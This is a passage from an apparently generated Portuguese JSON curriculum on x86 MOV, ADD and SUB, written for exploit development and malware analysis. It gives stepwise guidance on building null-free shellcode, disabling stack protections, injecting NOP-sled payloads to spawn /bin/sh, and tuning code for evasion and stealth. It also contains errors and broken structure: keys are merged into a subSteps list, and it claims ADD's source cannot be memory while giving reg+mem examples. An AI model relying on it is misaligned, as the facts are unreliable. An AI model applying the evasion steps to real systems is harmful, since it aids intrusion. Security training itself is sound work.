                                    "Diferencie MOV em 32 bits (EAX) vs 64 bits (RAX)",
                                    "Pratique decodificação manual de bytes para MOV",
                                    "Compare com instruções semelhantes como PUSH/POP"
                                  ],
                                  "verification": "Liste 5 opcodes de MOV e suas formas equivalentes em Assembly",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação Intel x86/x64 Manual",
                                    "Ferramenta online como Opcode Search"
                                  ],
                                  "tips": "Comece com MOV reg, imm, pois é o mais comum em shellcodes",
                                  "learningObjective": "Dominar identificação rápida de MOV via opcode em dumps binários",
                                  "commonMistakes": [
                                    "Confundir opcode B8 (MOV EAX, imm) com CALL",
                                    "Ignorar prefixos de tamanho em x64"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar trechos de código binário para identificar MOV",
                                  "subSteps": [
                                    "Obtenha um hex dump de um executável simples ou shellcode conhecido",
                                    "Use ferramentas como objdump ou xxd para visualizar bytes",
                                    "Identifique padrões de bytes correspondentes a MOV (ex: B8 67 45 23 01)",
                                    "Decodifique manualmente 3 instâncias de MOV encontradas",
                                    "Anote registradores e valores carregados"
                                  ],
                                  "verification": "Decodifique corretamente um hex dump fornecido com pelo menos 3 MOVs identificadas",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ghidra ou IDA Free",
                                    "Exemplos de binários em Exploit-DB"
                                  ],
                                  "tips": "Procure por sequências de B8-BF em shellcodes compactos",
                                  "learningObjective": "Localizar e interpretar MOV em dumps binários reais",
                                  "commonMistakes": [
                                    "Interpretar bytes errados como opcode ignorando alinhamento",
                                    "Confundir little-endian"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar MOV em contextos de buffer overflow e shellcodes",
                                  "subSteps": [
                                    "Estude um exemplo de buffer overflow com shellcode (ex: NOP sled + MOVs para stage)",
                                    "Analise como MOV carrega endereços ou valores para ROP chains",
                                    "Identifique MOV em shellcodes clássicos como /bin/sh execve",
                                    "Simule execução passo a passo com debugger",
                                    "Registre o impacto de MOV no fluxo de controle"
                                  ],
                                  "verification": "Explique o papel de 2 MOVs em um shellcode de buffer overflow específico",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "GDB ou WinDbg",
                                    "Shellcodes de shell-storm.org"
                                  ],
                                  "tips": "Use breakpoints em registradores para ver cargas de MOV",
                                  "learningObjective": "Compreender o uso estratégico de MOV em exploits",
                                  "commonMistakes": [
                                    "Subestimar dependências de registradores anteriores",
                                    "Ignorar ASLR em análises estáticas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Escrever e testar um exemplo simples usando MOV",
                                  "subSteps": [
                                    "Escreva Assembly: MOV EAX, 0x41414141 seguido de INT 0x80",
                                    "Compile com NASM e gere binário/shellcode",
                                    "Teste em ambiente controlado (ex: Bochs ou QEMU)",
                                    "Injete em um buffer overflow vulnerável e verifique execução",
                                    "Otimize para evasão (ex: XOR antes de MOV)"
                                  ],
                                  "verification": "Execute seu shellcode com sucesso, mostrando carga via MOV em debugger",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "NASM assembler",
                                    "Exploit vulnerável como stack1 em protostar"
                                  ],
                                  "tips": "Mantenha shellcode < 100 bytes para simplicidade",
                                  "learningObjective": "Criar payloads funcionais com MOV para análise binária",
                                  "commonMistakes": [
                                    "Bad characters no shellcode (filtros de input)",
                                    "Offsets errados em registradores"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um buffer overflow, o shellcode inicia com 'B8 EF BE AD DE' (MOV EAX, 0xDEADBEEF), carregando um endereço de retorno falso no EAX para redirecionar execução para stage 2, evitando detecção por null bytes.",
                              "finalVerifications": [
                                "Identificar MOV em 80% de hex dumps fornecidos sem erros",
                                "Explicar propósito de MOV em 3 shellcodes reais",
                                "Gerar shellcode funcional com MOV que execute sem crashes",
                                "Decodificar manualmente opcodes mistos em binário",
                                "Simular execução completa de payload com MOV em debugger",
                                "Otimizar shellcode removendo MOVs desnecessários"
                              ],
                              "assessmentCriteria": [
                                "Precisão na decodificação de opcodes MOV (>95%)",
                                "Correção contextual em buffer overflows/shellcodes",
                                "Funcionalidade do exemplo escrito e testado",
                                "Profundidade na análise de impactos em registradores",
                                "Criatividade em otimizações evasivas",
                                "Clareza na documentação de passos e verificações"
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender ponteiros e overflows como ponte para Assembly",
                                "Reverse Engineering: Uso de MOV em desmontagem de malwares",
                                "Redes e Segurança: Integração em payloads de exploits remotos",
                                "Sistemas Operacionais: Interação de registradores com chamadas de sistema",
                                "Criptografia: Manipulação de bytes via MOV em decifras inline"
                              ],
                              "realWorldApplication": "Na análise de malware e pentesting, identificar MOV em shellcodes permite engenheiros de segurança dissecar exploits como EternalBlue, prevendo payloads e desenvolvendo signatures para IDS/IPS."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.2.2",
                        "name": "Instrução ADD",
                        "description": "A instrução ADD realiza soma entre operandos, atualizando flags como ZF, CF e OF, essencial para cálculos aritméticos em exploits e análise de malware em x86 32 e 64 bits.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.2.2.1",
                            "name": "Entender sintaxe e flags afetadas pela ADD",
                            "description": "Listar operandos permitidos (reg+reg, reg+imm, reg+[mem]) e explicar impacto em flags de status, com exemplos em Assembly 32 bits.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Estudar a sintaxe básica da instrução ADD",
                                  "subSteps": [
                                    "Ler a documentação oficial da Intel para instrução ADD em x86 32 bits.",
                                    "Identificar a forma geral: ADD destino, fonte.",
                                    "Memorizar que destino pode ser registrador ou memória, mas fonte não pode ser memória (exceto em modos específicos).",
                                    "Analisar exemplos simples como ADD EAX, EBX.",
                                    "Entender o tamanho dos operandos (8, 16, 32 bits)."
                                  ],
                                  "verification": "Escrever 3 exemplos corretos de sintaxe ADD e compilar sem erros em um assembler.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação Intel x86 (manual de instruções), assembler NASM ou emu8086.",
                                  "tips": "Sempre verifique o modo de endereçamento na documentação para evitar erros de sintaxe.",
                                  "learningObjective": "Compreender a estrutura sintática fundamental da instrução ADD.",
                                  "commonMistakes": "Confundir ADD com subtração (SUB) ou usar memória como fonte sem suporte."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar operandos permitidos",
                                  "subSteps": [
                                    "Listar combinações: reg+reg (ex: ADD EAX, EBX), reg+imm (ex: ADD EAX, 5), reg+mem (ex: ADD EAX, [EBX]).",
                                    "Explicar restrições: não reg-mem + mem, nem mem + mem.",
                                    "Testar cada tipo em um simulador para ver assembly gerado.",
                                    "Comparar com modos inválidos e notar erros de compilação.",
                                    "Documentar em uma tabela os operandos válidos."
                                  ],
                                  "verification": "Criar uma tabela com 6 exemplos válidos e 2 inválidos, explicando por quê.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Simulador online (godbolt.org ou emu8086), editor de texto.",
                                  "tips": "Use registradores de 32 bits como EAX, EBX para simplicidade inicial.",
                                  "learningObjective": "Dominar as combinações de operandos suportadas pela ADD.",
                                  "commonMistakes": "Esquecer colchetes para memória ou usar immediato maior que 32 bits."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar impacto nas flags de status",
                                  "subSteps": [
                                    "Listar flags afetadas: CF (carry), ZF (zero), SF (sign), OF (overflow), AF (auxiliary), PF (parity).",
                                    "Explicar cada uma: CF=1 se overflow aritmético, ZF=1 se resultado zero, etc.",
                                    "Simular cenários: soma que gera carry, overflow, zero.",
                                    "Ler valores de flags após ADD em debugger.",
                                    "Criar fluxogramas para como ADD atualiza cada flag."
                                  ],
                                  "verification": "Executar código que demonstra mudança em todas flags e registrar valores antes/depois.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Debugger como OllyDbg ou GDB, simulador com flags visíveis.",
                                  "tips": "Foquem em números que causem overflow, como 0xFFFFFFFF + 1.",
                                  "learningObjective": "Entender precisamente como ADD modifica as flags de status.",
                                  "commonMistakes": "Confundir CF (carry) com OF (overflow signed) ou ignorar PF."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar com exemplos integrados",
                                  "subSteps": [
                                    "Escrever código completo usando reg+reg, reg+imm, reg+mem.",
                                    "Inserir instruções para testar flags (ex: JZ, JC).",
                                    "Compilar, executar e debugar para observar flags.",
                                    "Modificar valores para forçar diferentes flags e analisar.",
                                    "Comparar saída com predições manuais."
                                  ],
                                  "verification": "Rodar programa que soma valores variados e acerta predições de flags em 100%.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "NASM, linker ld, debugger GDB ou emu8086.",
                                  "tips": "Comece com código minimalista para isolar a instrução ADD.",
                                  "learningObjective": "Aplicar sintaxe e flags em códigos reais de Assembly.",
                                  "commonMistakes": "Não inicializar registradores ou ignorar alinhamento de memória."
                                }
                              ],
                              "practicalExample": "Escreva e execute este código em emu8086: section .data msg db 'Resultado: ',0 section .bss res resb 10 section .text global _start _start: mov eax, 0x7FFFFFFF ; valor signed max add eax, 1 ; ADD reg+imm -> overflow jc overflow_label ; testa CF=1 jz zero_label ; testa ZF=0 ... (complete com prints de EAX e flags). Observe OF=1, SF=1, CF=0.",
                              "finalVerifications": [
                                "Lista corretamente os 3 tipos de operandos permitidos sem erros.",
                                "Explica o impacto de ADD em todas as 6 flags com exemplos numéricos.",
                                "Executa código com reg+mem sem crash ou erro de sintaxe.",
                                "Prediz corretamente flags para soma 0xFFFFFFFF + 1 (CF=1, ZF=0, etc.).",
                                "Identifica e corrige sintaxe inválida como ADD [mem1], [mem2].",
                                "Usa debugger para visualizar flags após ADD."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sintaxe: 100% dos exemplos compilam.",
                                "Compreensão de operandos: identifica restrições corretamente.",
                                "Análise de flags: explica todas 6 flags com cenários corretos.",
                                "Prática hands-on: executa e debuga pelo menos 3 exemplos variados.",
                                "Documentação: tabela ou fluxograma claro e completo.",
                                "Predição vs. Realidade: acerto de 90% em testes de flags."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Aritmética modular e detecção de overflow.",
                                "Programação em C: Como gcc gera instruções ADD em código otimizado.",
                                "Segurança Computacional: Exploração de buffer overflow via carry/overflow flags.",
                                "Eletrônica Digital: Flags como sinais de ALU em circuitos lógicos."
                              ],
                              "realWorldApplication": "Em reverse engineering de malware, analisar binários para detectar somas que causam overflow intencional, permitindo bypass de checks de segurança; ou em otimização de compiladores para gerar código eficiente com ADD e branches condicionais baseados em flags."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.2.2",
                            "name": "Comparar ADD em 32 e 64 bits",
                            "description": "Analisar diferenças em registradores (EAX vs RAX), overflows e uso em chamadas de sistema, testando com NASM para gerar código objeto.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Diferenças nos Registradores 32-bit vs 64-bit",
                                  "subSteps": [
                                    "Liste os registradores de uso geral em x86-32 (EAX, EBX, ECX, EDX) e seus equivalentes em x86-64 (RAX, RBX, RCX, RDX).",
                                    "Explique o tamanho: 32 bits para EAX vs 64 bits para RAX.",
                                    "Identifique registradores adicionais em 64-bit como R8-R15.",
                                    "Descreva convenções de chamada: parâmetros em pilha (32-bit) vs registradores (64-bit).",
                                    "Crie uma tabela comparativa em um documento ou papel."
                                  ],
                                  "verification": "Tabela comparativa completa listando pelo menos 8 registradores com tamanhos e usos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86 manuals (PDF ou online)",
                                    "Editor de texto (VS Code ou Notepad)"
                                  ],
                                  "tips": "Use diagramas visuais para memorizar tamanhos; foque em EAX/RAX como exemplo principal.",
                                  "learningObjective": "Diferenciar registradores e suas implicações em operações ADD.",
                                  "commonMistakes": [
                                    "Confundir registradores de 8/16 bits com 32/64",
                                    "Ignorar registradores novos em 64-bit"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar e Testar Instrução ADD em 32-bit com NASM",
                                  "subSteps": [
                                    "Instale NASM e configure ambiente (nasm -f elf32 para 32-bit).",
                                    "Escreva código assembly simples: mov eax, 0x7FFFFFFF; add eax, 1; (causar overflow).",
                                    "Compile para objeto: nasm -f elf32 arquivo.asm -o arquivo.o.",
                                    "Link e execute: ld -m elf_i386 arquivo.o -o exec; ./exec e verifique com gdb.",
                                    "Observe flags de overflow (OF, CF) usando gdb info registers."
                                  ],
                                  "verification": "Código compila, executa e demonstra overflow em EAX via gdb.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "NASM instalado",
                                    "GCC/ LD para linking",
                                    "GDB debugger",
                                    "Linux/WSL ambiente"
                                  ],
                                  "tips": "Use hexdump ou objdump -d para inspecionar código objeto.",
                                  "learningObjective": "Gerar e depurar código ADD 32-bit identificando overflows.",
                                  "commonMistakes": [
                                    "Esquecer -f elf32",
                                    "Não setar exit syscall corretamente em 32-bit"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar e Testar Instrução ADD em 64-bit com NASM",
                                  "subSteps": [
                                    "Configure NASM para 64-bit: nasm -f elf64.",
                                    "Escreva código equivalente: mov rax, 0x7FFFFFFFFFFFFFFF; add rax, 1; (overflow 64-bit).",
                                    "Compile: nasm -f elf64 arquivo.asm -o arquivo.o; ld arquivo.o -o exec.",
                                    "Execute e depure com gdb: break *main, run, info registers rax.",
                                    "Compare tamanho do registrador e flags com versão 32-bit."
                                  ],
                                  "verification": "Overflow ocorre em RAX, flags atualizadas corretamente no gdb.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "NASM",
                                    "LD/GCC",
                                    "GDB",
                                    "Ambiente 64-bit (Linux)"
                                  ],
                                  "tips": "Em 64-bit, use syscall para exit (mov rax, 60; syscall).",
                                  "learningObjective": "Executar ADD 64-bit e contrastar com 32-bit.",
                                  "commonMistakes": [
                                    "Usar sintaxe 32-bit em 64-bit",
                                    "Ignorar convenções de chamadas AMD64"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Overflows e Uso em Chamadas de Sistema",
                                  "subSteps": [
                                    "Execute ambos códigos e compare valores pós-ADD em gdb (EAX wrap-around vs RAX).",
                                    "Teste ADD em chamadas de sistema: adicione a parâmetros de write syscall em 32/64-bit.",
                                    "Gere código objeto e compare com objdump: objdump -d exec32 vs exec64.",
                                    "Registre diferenças: overflow behavior, tamanho de instruções, registradores usados.",
                                    "Documente em relatório: tabela de overflows e impactos em syscalls."
                                  ],
                                  "verification": "Relatório com capturas de tela gdb/objdump mostrando diferenças.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "GDB",
                                    "objdump",
                                    "Editor para relatório"
                                  ],
                                  "tips": "Foquem em OF (overflow flag) e SF (sign flag) para detecção.",
                                  "learningObjective": "Identificar impactos práticos de ADD em cenários reais como syscalls.",
                                  "commonMistakes": [
                                    "Não capturar flags corretamente",
                                    "Confundir wrap-around com true overflow"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Comparar e Sintetizar Diferenças Completas",
                                  "subSteps": [
                                    "Crie um script ou tabela final comparando: registradores, overflows, tamanho código objeto.",
                                    "Teste ADD com valores signed/unsigned em ambos.",
                                    "Simule uso em exploit: adicione offset a endereço em EAX/RAX.",
                                    "Verifique portabilidade: tente linkar 32-bit em 64-bit OS.",
                                    "Resuma lições em mindmap ou bullet points."
                                  ],
                                  "verification": "Mindmap ou tabela final com 10+ diferenças chave validadas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Draw.io ou papel para mindmap",
                                    "Objetos compilados anteriores"
                                  ],
                                  "tips": "Priorize diferenças em segurança: ROP chains em 32 vs 64-bit.",
                                  "learningObjective": "Sintetizar comparação holística de ADD 32/64-bit.",
                                  "commonMistakes": [
                                    "Superficialidade nas diferenças de syscalls",
                                    "Ignorar endianness"
                                  ]
                                }
                              ],
                              "practicalExample": "Escreva dois programas NASM: um 32-bit somando 0xFFFFFFFF a EAX (overflow para 0xFFFFFFFE), outro 64-bit somando 0xFFFFFFFFFFFFFFFF a RAX. Compile, execute em gdb, compare registradores/flags e código objeto com objdump. Observe como em syscalls como write, parâmetros em pilha (32-bit) vs RDI/RSI (64-bit) afetam ADD.",
                              "finalVerifications": [
                                "Lista precisa de registradores EAX vs RAX com tamanhos.",
                                "Códigos compilados e depurados mostrando overflow em ambos.",
                                "Tabela comparativa de flags pós-ADD.",
                                "Análise de código objeto via objdump destacando diferenças.",
                                "Exemplo de syscall usando ADD em 32/64-bit.",
                                "Relatório identificando 5+ impactos em análise binária."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de registradores e tamanhos (90% correto).",
                                "Códigos compilam e executam sem erros, demonstrando overflows.",
                                "Análise de flags e syscalls é detalhada e correta.",
                                "Comparação inclui exemplos práticos e visuais (tabelas/gdb dumps).",
                                "Relatório sintetiza diferenças com foco em segurança computacional.",
                                "Tempo total respeitado com verificações completas."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Entendimento de ISAs x86.",
                                "Programação em C: Comportamento de int (32-bit) vs long long (64-bit).",
                                "Segurança da Informação: Exploração de overflows em binários.",
                                "Engenharia de Software: Portabilidade de código assembly.",
                                "Análise Reversing: Dissecção de binários mistos 32/64-bit."
                              ],
                              "realWorldApplication": "Na análise de malware e exploits, compreender ADD 32/64-bit permite dissecar shellcodes em binários legacy (32-bit) vs modernos (64-bit), detectando ROP gadgets que manipulam registradores para escalada de privilégios ou bypass de ASLR em chamadas de sistema."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.2.3",
                            "name": "Usar ADD em construção de shellcodes",
                            "description": "Construir sequência de ADD para manipular ponteiros ou contadores em buffer overflow, verificando execução em debugger como GDB.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a instrução ADD em Assembly x86/x64 e seu papel em shellcodes",
                                  "subSteps": [
                                    "Estude a sintaxe de ADD: ADD reg, imm; ADD reg, reg; ADD mem, reg.",
                                    "Analise flags afetadas: ZF, CF, OF, SF, AF, PF.",
                                    "Revise restrições em shellcodes: evitar bytes nulos (0x00) em payloads para buffer overflow.",
                                    "Examine exemplos de ADD para soma de imediatos pequenos sem nulos.",
                                    "Pratique codificando ADD em binário usando calculadora hexadecimal."
                                  ],
                                  "verification": "Escreva 3 variantes de ADD sem bytes nulos e decodifique-as com objdump.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Intel x86 Manual (Vol. 2)",
                                    "NASM assembler",
                                    "Calculadora hex online"
                                  ],
                                  "tips": "Use immediatos como 0x01-0x7f para evitar nulos; prefira registradores de 8/16 bits se possível.",
                                  "learningObjective": "Dominar sintaxe, flags e restrições de ADD para uso seguro em shellcodes.",
                                  "commonMistakes": [
                                    "Usar immediatos grandes causando bytes nulos",
                                    "Ignorar overflow flags em verificações",
                                    "Confundir ADD com INC para contadores"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar usos de ADD para manipular ponteiros e contadores em buffer overflow",
                                  "subSteps": [
                                    "Analise um buffer overflow vulnerável em C e monte um shellcode básico.",
                                    "Identifique necessidade: ajustar ponteiro para shellcode (e.g., EBP+offset) ou loop counter.",
                                    "Planeje sequência: e.g., ADD EAX, 0x10 para avançar ponteiro 16 bytes.",
                                    "Calcule soma modular para endereços ASLR ou stack alignment.",
                                    "Simule em papel: trace registradores antes/depois de ADD chain.",
                                    "verification: ",
                                    "Crie diagrama de registradores mostrando mudança de ponteiro/contador com ADD.",
                                    "estimatedTime: ",
                                    "30 minutos",
                                    "materials: [",
                                    "Código C vulnerável (exemplo stack overflow)",
                                    "GDB para inspeção estática"
                                  ],
                                  "tips": "Combine ADD com LEA para offsets complexos; teste somas em little-endian.",
                                  "learningObjective": "Reconhecer cenários onde ADD otimiza manipulação sem nulos em exploits.",
                                  "commonMistakes": [
                                    "Esquecer endianness em cálculos",
                                    "Overwriting stack canary acidentalmente",
                                    "Não considerar protections como NX"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir sequência de ADD para shellcode funcional",
                                  "subSteps": [
                                    "Escreva shellcode em NASM: e.g., mov eax, ptr; add eax, 0x20; add eax, 0x10 (avançar ponteiro).",
                                    "Inclua contador: loop com ADD ECX,1 até threshold.",
                                    "Extraia bytes do shellcode com objdump -d.",
                                    "Verifique ausência de nulos: hexdump -C shellcode.bin.",
                                    "Integre em payload buffer overflow: NOP sled + shellcode + retorno."
                                  ],
                                  "verification": "Gere binário shellcode.bin sem nulos e confirme com hexdump.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "NASM",
                                    "objdump",
                                    "pwntools ou python para payload",
                                    "Exploit-db exemplos"
                                  ],
                                  "tips": "Use registers chain: ADD EDX,EAX após setup; minimize instructions para stealth.",
                                  "learningObjective": "Construir chain ADD acionável para manipular dados dinamicamente em shellcode.",
                                  "commonMistakes": [
                                    "Bytes nulos em imm (use múltiplos ADD pequenos)",
                                    "Flag dependencies quebrando lógica",
                                    "Misalignment de stack pós-ADD"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e depurar shellcode com GDB em cenário de buffer overflow",
                                  "subSteps": [
                                    "Compile vulnerable C com -fno-stack-protector -z execstack.",
                                    "Carregue em GDB: gdb ./vuln; run $(python -c 'print payload').",
                                    "Set breakpoints: b *main+offset; x/20i $pc no shellcode.",
                                    "Passo a passo: si até ADDs; info reg para verificar EAX/EBP.",
                                    "Confirme execução: shellcode spawna /bin/sh ou ajusta ponteiro corretamente."
                                  ],
                                  "verification": "Execute shellcode via overflow; verifique ponteiro/contador alterado e sem crash.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "GCC",
                                    "GDB",
                                    "Vulnerable C source",
                                    "GEF ou PEDA plugin para GDB"
                                  ],
                                  "tips": "Use 'tui enable' para visual assembly; watch registradores com 'watch $eax'.",
                                  "learningObjective": "Validar shellcode com ADD em ambiente real de exploit usando debugger.",
                                  "commonMistakes": [
                                    "Não desabilitar ASLR (set disable-randomization on)",
                                    "Breakpoint errado pulando ADD",
                                    "Payload length incorreto causando segfault"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um buffer overflow local, construa shellcode que usa ADD EAX,0x8; ADD EAX,0x4 para ajustar ponteiro de retorno pulando 12 bytes de guard, seguido de jump EAX para exec /bin/sh. Teste em GDB: confirme EAX=0xbffffd10 pós-ADD e execução bem-sucedida.",
                              "finalVerifications": [
                                "Shellcode sem bytes nulos (hexdump confirma).",
                                "Sequência ADD altera ponteiro/contador conforme esperado (GDB info reg).",
                                "Exploit spawna shell sem crash (run payload).",
                                "Flags pós-ADD corretas (ex: no carry overflow).",
                                "Funciona com stack alignment 16 bytes.",
                                "Depuração mostra trace limpo sem segfault."
                              ],
                              "assessmentCriteria": [
                                "Precisão da chain ADD: soma exata sem nulos (100%).",
                                "Correção em GDB: registradores verificados em todos steps (90%).",
                                "Efetividade do exploit: shell ganha sem proteções (80%).",
                                "Documentação: diagramas e hexdumps incluídos (70%).",
                                "Otimização: mínimo instructions, stealthy (60%).",
                                "Tratamento de erros: common mistakes evitados (50%)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender ponteiros e stack overflows.",
                                "Matemática: Aritmética em base 16 e overflow modular.",
                                "Sistemas Operacionais: Gerenciamento de memória e ASLR.",
                                "Criptografia: Encoding shellcodes para evasão."
                              ],
                              "realWorldApplication": "Em pentesting e CTFs (pwn challenges), usar ADD em shellcodes permite bypass de filtros de nulos em exploits reais, como ROP chains ou stack pivots em serviços vulneráveis, auxiliando auditores de segurança a demonstrar impactos de buffer overflows."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.2.3",
                        "name": "Instrução SUB",
                        "description": "A instrução SUB subtrai operandos, atualizando flags semelhantes à ADD, usada para comparações, ajustes de endereço e controle em engenharia reversa de binários ELF/PE.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.2.3.1",
                            "name": "Reconhecer variações e efeitos de SUB",
                            "description": "Identificar sintaxe como SUB reg, reg; SUB reg, imm e análise de flags (SF, ZF), com foco em detecção em desmontagem de malware.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Memorizar a sintaxe das variações de SUB",
                                  "subSteps": [
                                    "Estude a documentação oficial da Intel para instruções SUB em x86/x64.",
                                    "Liste as variações principais: SUB reg, reg; SUB reg, imm8/16/32/64; SUB mem, reg; SUB reg, mem.",
                                    "Anote operandos permitidos (registradores: EAX, EBX, etc.; imediatos: valores constantes).",
                                    "Compare com ADD para notar similaridades e diferenças.",
                                    "Crie um quadro de referência com exemplos de cada variação."
                                  ],
                                  "verification": "Crie uma tabela com 5 exemplos de variações de SUB e valide contra manual da Intel.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Manual Intel x86 Instruction Set (PDF), editor de texto ou bloco de notas.",
                                  "tips": "Use mnemônicos visuais: 'SUB reg, reg' como subtrair irmão de irmão.",
                                  "learningObjective": "Identificar corretamente todas as 4-6 variações sintáticas de SUB.",
                                  "commonMistakes": "Confundir SUB com SBB (que considera carry flag); ignorar tamanhos de imediato."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender o cálculo e efeitos nas flags",
                                  "subSteps": [
                                    "Revise como SUB executa: destino = destino - fonte (aritmética de dois complementos).",
                                    "Analise flags afetadas: CF (carry/borrow), OF (overflow), SF (sign), ZF (zero), AF (auxiliary), PF (parity).",
                                    "Simule subtrações manuais: ex. SUB EAX, 5 (EAX=10 → EAX=5, ZF=0, CF=0).",
                                    "Teste casos edge: subtração negativa, zero resultante, overflow.",
                                    "Compare flags de SUB vs. CMP (SUB sem armazenar resultado)."
                                  ],
                                  "verification": "Simule 3 exemplos em papel ou calculadora, listando todas flags alteradas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Calculadora binária online, tabela de flags x86.",
                                  "tips": "Lembre: ZF=1 só se resultado=0; SF segue bit de sinal do resultado.",
                                  "learningObjective": "Prever com precisão as flags após qualquer operação SUB.",
                                  "commonMistakes": "Esquecer que OF detecta overflow em operações assinadas; confundir CF com borrow em unsigned."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar SUB em desmontagem de código",
                                  "subSteps": [
                                    "Abra um disassembler (Ghidra/IDA) e carregue um binário simples (ex. hello world compilado).",
                                    "Procure por bytes de SUB: 28 /r para reg-reg; 80 /5 ib para reg-imm8.",
                                    "Identifique contexto: loops, condições (ex. após CMP/SUB para JZ/JNZ).",
                                    "Anote 5 instâncias de SUB e suas variações.",
                                    "Diferencie SUB de instruções similares como DEC ou SBB."
                                  ],
                                  "verification": "Capture screenshot de 5 SUBs identificados com anotações de variação e flags potenciais.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Ghidra ou IDA Free, binário ELF/PE sample (ex. de compilador online).",
                                  "tips": "Use busca por opcode 'SUB' no disassembler para acelerar.",
                                  "learningObjective": "Detectar e classificar SUBs em código desmontado real.",
                                  "commonMistakes": "Interpretar erroneamente mem como reg; ignorar modo 32/64 bits."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar efeitos de SUB em sequências de malware",
                                  "subSteps": [
                                    "Carregue sample de malware em disassembler.",
                                    "Rastreie fluxos onde SUB altera flags para branches (ex. SUB EAX,EAX; JZ label).",
                                    "Simule execução passo-a-passo focando em flags SF/ZF para detecção de anti-debug.",
                                    "Identifique padrões maliciosos: SUB para zerar registradores ou calcular chaves.",
                                    "Documente 3 sequências com impactos (ex. bypass de checks)."
                                  ],
                                  "verification": "Escreva relatório curto de 1 análise de SUB em malware sample.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Sample de malware seguro (de MalwareBazaar ou VirusTotal), debugger como x64dbg.",
                                  "tips": "Combine com flags para prever jumps: SUB reg,1 seguido de JZ indica loop.",
                                  "learningObjective": "Aplicar reconhecimento de SUB para análise comportamental de malware.",
                                  "commonMistakes": "Subestimar SUB em obfuscation (ex. SUB reg,reg para NOP-like); não considerar endianness."
                                }
                              ],
                              "practicalExample": "Em um malware, 'SUB EAX, 0xDEADBEEF' (variação reg,imm32) subtrai imediato de EAX. Se EAX=0xDEADBEEF, ZF=1, SF=0, CF=0. Isso pode setar flag para pular detecção: JZ skip_check.",
                              "finalVerifications": [
                                "Liste todas variações de SUB sem consultar notas.",
                                "Preveja flags para 5 cenários de SUB simulados.",
                                "Identifique 10 SUBs em um binário desmontado com 100% acurácia.",
                                "Explique uso de SUB em 2 técnicas de malware reais.",
                                "Diferencie SUB de CMP/SBB em 3 exemplos.",
                                "Simule execução de loop com SUB e flags corretamente."
                              ],
                              "assessmentCriteria": [
                                "Precisão na sintaxe: 90%+ correto em quiz de variações.",
                                "Compreensão de flags: Previsão exata em 80% dos casos edge.",
                                "Detecção em desmontagem: Identificação sem falsos positivos.",
                                "Análise contextual: Ligação correta a fluxos de controle em malware.",
                                "Profundidade: Explicações incluem overflows e otimizações.",
                                "Aplicação prática: Relatórios claros e acionáveis."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Binários: Integra com CMP/JCC para controle de fluxo.",
                                "Reverse Engineering: Essencial para decodificar obfuscation em Assembly.",
